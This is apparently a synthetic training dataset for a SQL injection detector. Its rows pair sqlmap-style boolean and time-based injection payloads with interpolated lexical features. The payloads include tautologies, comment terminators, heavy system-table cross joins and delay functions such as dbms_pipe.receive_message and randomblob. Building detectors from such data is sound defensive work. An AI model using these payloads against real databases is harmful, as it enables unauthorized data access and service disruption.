id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_000011,attack,boolean,"1 or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  -- dpph",nearest_attack_euclidean,R000045,0.32052230083554983,133.22107345366433,32.11053672683216,4.274975452032936,74.55785309267137,9.0,34.33161018049648,15.331610180496483,0.559711164149288,0.06755835917109557,0.2576768396870758,0.11505363699254065,0.0,0.11053672683216142,2.0,0.0,1.0,1.0,0.0,4.110536726832161,0.11053672683216131,0.0,3.0,4.0,0.0,0.11053672683216126,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000012,attack,boolean,1'  )   and   (  1471  =  7892  )  *7892 and   (  'kkok' like 'kkok,nearest_attack_euclidean,R000051,0.15519634227944207,68.16607815503744,20.0,3.3946323426836496,17.999999999999996,13.0,26.99949556146066,10.166582593576777,0.2647891271806387,0.1912365918526835,0.3948126350814245,0.1491616458852533,4.0,1.1102230246251565e-16,0.0,0.0,1.0,1.0,0.0,4.166582593576777,0.0,0.0,0.0,2.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000013,attack,boolean,"1""  )   as gtpi where 8100  =  8100 and make_set  (  2678  =  9169,9169  )  --",nearest_attack_euclidean,R000031,0.23570040631026123,75.88465295311232,28.349123985573026,3.9357934153616987,20.023685978359538,21.0,25.023685978359538,9.837280996393257,0.2629723460151252,0.2779925617326708,0.3291610511895707,0.12987404106263326,0.0,1.0,2.0,0.0,0.0,2.0,0.0,2.837280996393256,0.0,1.0,1.0,4.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000014,attack,boolean,"-9688%'   )    )     )   or elt  (  3695  =  7995,7995  )   and    (    (     (  '%'  =  '",nearest_attack_euclidean,R000089,0.16341290366259523,89.62033947517159,22.379660524828406,2.946689991044096,8.303728419862722,16.0,47.392543160274556,17.92406789503432,0.0928591950308853,0.17857183900617707,0.5285689659629377,0.2,4.0,1.1102230246251565e-16,1.0,0.0,0.0,2.0,0.0,7.848135790068638,1.9999999999999998,0.07593210496568092,1.0,3.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000015,attack,boolean,1   )    )     )   rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )    and    (    (     (  2197  =  2197,nearest_attack_euclidean,R000132,0.460514883474506,142.2430606402536,25.126156559957735,3.1010628387331325,35.009252479661875,19.990747520338125,72.99074752033812,14.25231311991547,0.2464427054679713,0.14029771946113145,0.5129748562109941,0.1002847188599031,0.5046262398309382,1.1102230246251565e-16,0.0,0.0,0.0,2.0,0.0,11.74768688008453,0.0,0.0,0.0,2.0,0.12615655995773456,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,4.0
SMOTE_000016,attack,boolean,"1'  )   or 8384  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   ",nearest_attack_euclidean,R000115,0.13186992433685055,107.24990989002775,32.01470058176634,3.6156777108488285,31.191107562962397,15.0,46.04410174529902,15.014700581766338,0.2906769145799002,0.1399043828496822,0.42939576664197454,0.140022935928443,3.0,1.1102230246251565e-16,0.0,1.0,0.0,1.0,0.0,9.0,0.0,0.0,1.0,2.0,1.0,0.0,0.0,0.01470058176633846,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
SMOTE_000017,attack,boolean,"1%'  )   and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and   (  '%'  =  '",nearest_attack_euclidean,R000127,1.0819516168872576,124.60484512065119,30.0,3.728706531874272,46.358395559259584,11.27903097586976,47.62322478069581,19.344193804826048,0.3638667342657935,0.093024248387896,0.3868706690907805,0.15623834825553,4.0,1.1102230246251565e-16,0.0,0.0,1.0,2.0,0.0,7.3116123903479044,1.9999999999999998,0.6558061951739521,1.3441938048260478,3.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000018,attack,boolean,"1'  )   and make_set  (  4551  =  6487,6487  )   and   (  'jnqa'  =  'jnqa",nearest_attack_euclidean,R000104,0.8191552546866926,80.40983395291288,24.0,3.539367304614174,21.0,13.0,33.494143388211036,12.91569056470184,0.2631132504589726,0.16287963123650687,0.4132511148719374,0.16075600343258317,4.0,1.1102230246251565e-16,0.0,0.0,0.0,2.0,0.0,4.91569056470184,0.0,1.0,1.0,2.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000019,attack,boolean,"-3953  )   as wjjk where 6433  =  6433 or make_set  (  9354  =  9354,7185  )  --",nearest_attack_euclidean,R000232,0.37921962048294444,76.44390475892592,26.0,3.8494643900613545,17.33292856919444,24.0,25.110976189731478,10.0,0.22530489415920776,0.31481706350447536,0.32870426587611884,0.13117377646019807,0.0,1.1102230246251565e-16,3.0,0.0,0.0,2.0,0.0,3.0,0.0,1.0,1.0,5.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000020,attack,boolean,"1  )   or 6979  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",nearest_attack_euclidean,R000044,1.047349026177276,107.0730762203279,33.0,3.7029142139681133,31.308974593224033,15.0,44.76410162710387,16.0,0.2925135708322778,0.1401149785445398,0.4179154735090066,0.1494559771141758,2.0,0.3089745932240321,2.0,1.0,0.0,1.0,0.0,8.691025406775967,0.0,0.0,1.0,4.0,1.0,0.30897459322403203,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.3089745932240321,0.6910254067759678,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
SMOTE_000021,attack,boolean,"1  )   and 6414  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and   (  4557  =  4557",nearest_attack_euclidean,R000291,1.2620903017930543,151.94627930304785,30.3213954006773,4.060746469891041,71.94627930304785,17.339302299661348,45.98209310101595,16.6786045993227,0.47307566700149484,0.11429540911602722,0.3025960805750872,0.11003284330739077,0.0,1.1102230246251565e-16,0.0,0.0,1.0,2.0,0.0,6.0,0.0,1.6965114983067515,3.33930229966135,3.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000022,attack,boolean,"1'   )    )    as ngoo where 8641  =  8641 and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",nearest_attack_euclidean,R000055,0.97364916365615,160.60875465661618,32.0,4.037769339154671,73.60875465661618,18.0,48.0,21.0,0.4583059648728885,0.11207462795733342,0.2988656745528891,0.130753732616889,1.0,1.1102230246251565e-16,2.0,0.0,1.0,2.0,0.0,6.0,0.0,5.0,4.0,5.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,0.608754656616181,0.391245343383819,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000023,attack,boolean,"select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and 'qipt'  =  'qipt",nearest_attack_euclidean,R000072,0.08000326062113439,114.0,28.604364820887444,4.151016159527845,71.0,5.0,22.0,16.0,0.6228070175438597,0.043859649122807015,0.19298245614035087,0.14035087719298245,3.0,1.1102230246251565e-16,0.0,0.0,1.0,1.0,0.0,2.0,0.0,5.0,4.0,2.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000024,attack,boolean,1'   )    )    and   (  3020  =  3020  )  *6703 and    (    (   'vvkd' like 'vvkd,nearest_attack_euclidean,R000308,0.5987949647797591,81.43236726888517,20.21618363444259,3.133245961604758,17.78381636555741,13.0,38.43236726888518,12.21618363444259,0.21845999029751853,0.15965777562167077,0.4719012037129351,0.14998103036787558,4.0,1.1102230246251565e-16,0.0,0.0,0.7838163655574105,1.2161836344425896,0.0,6.0,0.0,0.0,0.21618363444258937,2.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000025,attack,boolean,"1  )   as iuje where 1976  =  1976 and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )  --",nearest_attack_euclidean,R000264,0.2374746398202294,154.10731312365286,32.0,3.8422943711685225,47.519322451197695,24.0,57.58799067245516,25.0,0.3082391617446754,0.15581210745262752,0.3736444522062101,0.162304278596487,0.0,0.06866822125747263,2.0,0.0,0.0,2.0,0.0,10.931331778742528,0.0,2.0,1.0,10.0,0.0,0.06866822125747252,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.9313317787425275,0.06866822125747246,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000026,attack,boolean,"1' in boolean mode  )   and 8189  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",nearest_attack_euclidean,R000018,1.187936310901017,145.52233237927655,30.0,4.035929002233395,84.52233237927655,8.0,38.0,15.0,0.5808154121462386,0.054975027915247415,0.2611313825974252,0.10307817734108889,1.0,1.1102230246251565e-16,2.0,0.0,1.0,1.0,0.0,5.0,0.0,0.0,2.0,4.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.5223323792765449,0.47766762072345514,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000027,attack,boolean,"select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and   (  ""gzhp""  =  ""gzhp",nearest_attack_euclidean,R000240,1.339639650785721,125.82869097980733,30.552460653204893,4.212127856441393,77.10492130640978,5.447539346795107,29.723769673397555,13.552460653204893,0.6123933560986081,0.04367125207931252,0.23652731043676192,0.10740808138531738,0.0,1.9143454899036696,0.0,0.0,1.0,1.0,0.0,3.3618848366987764,0.0,0.0,2.638115163301223,2.0,0.0,0.6381151633012232,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000028,attack,boolean,"1%""   )    )    and elt  (  7633  =  4110,4110  )   and    (    (   ""%""  =  """,nearest_attack_euclidean,R000237,1.4118072007784712,74.63258625085547,18.526517250171093,2.8265677156972284,7.106069000684371,12.526517250171093,40.0,15.0,0.09442172380862146,0.1678063143943097,0.5365614267615046,0.20121053503556424,0.0,4.0,0.4734827498289078,0.0,0.0,2.0,0.0,6.0,1.9999999999999998,0.0,0.5265172501710922,2.4734827498289076,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.5265172501710924,0.47348274982890776,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000029,attack,boolean,"1"" or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and ""kbex"" like ""kbex",nearest_attack_euclidean,R000143,1.8105163832672477,144.62037150837418,32.513374612041574,4.240423291514021,81.62037150837418,9.486625387958426,35.54012383612472,17.97325077591685,0.5639541421393851,0.06576816103693374,0.24566273757299806,0.12461495925068311,0.0,4.0,0.0,0.0,1.0,1.0,0.0,4.0,0.0,2.4331269397921265,3.486625387958425,2.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
